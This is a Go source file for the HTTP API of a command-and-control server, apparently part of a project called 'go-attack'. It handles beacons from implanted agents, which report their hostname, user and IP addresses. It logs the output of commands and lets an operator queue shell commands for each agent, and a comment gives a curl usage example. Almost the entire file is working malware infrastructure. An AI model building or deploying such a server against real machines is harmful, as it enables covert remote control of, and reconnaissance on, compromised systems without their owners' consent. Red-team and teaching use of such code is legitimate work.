package internal

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"log"
	"net/http"

	"github.com/ianwong123/go-attack/c2/protocol"
)

type API struct {
	store *Store
}

func NewAPI(s *Store) http.Handler {
	a := &API{store: s}
	mux := http.NewServeMux()
	mux.HandleFunc("POST /beacon", a.handleBeacon)
	mux.HandleFunc("POST /task", a.handleEnqueueTask)
	mux.HandleFunc("GET /agents", a.handleListAgents)
	return mux
}

// handleBeacon is called by agent every interval
// records checkin, logs results, and returns a queued task if any
func (a *API) handleBeacon(w http.ResponseWriter, r *http.Request) {
	var beacon protocol.Beacon
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	a.store.Upsert(beacon)
	log.Printf("beacon: agent=%s host=%s user=%s ips=%v",
		beacon.AgentID[:8], beacon.Hostname, beacon.Username, beacon.IPs)

	if beacon.Result != nil {
		log.Printf("result: task=%s success=%v\n%s",
			beacon.Result.TaskID, beacon.Result.Success, beacon.Result.Output)
	}

	task := a.store.Dequeue(beacon.AgentID)
	if task == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(task)
}

// handleEnqueueTask lets the operator queue a command for an agent.
// Usage: curl -X POST /task -d '{"agent_id":"...","command":"shell","args":"whoami"}'
func (a *API) handleEnqueueTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
		Args    string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	taskID := GenerateID()
	task := protocol.Task{
		TaskID:  taskID,
		Command: req.Command,
		Args:    req.Args,
	}
	a.store.Enqueue(req.AgentID, task)
	log.Printf("[task] queued task=%s agent=%s cmd=%s args=%s",
		taskID, req.AgentID[:8], req.Command, req.Args)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"task_id": taskID})
}

func (a *API) handleListAgents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(a.store.All())
}

func GenerateID() string {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		panic("crypto/rand unavailable: " + err.Error())
	}
	return hex.EncodeToString(buf)
}
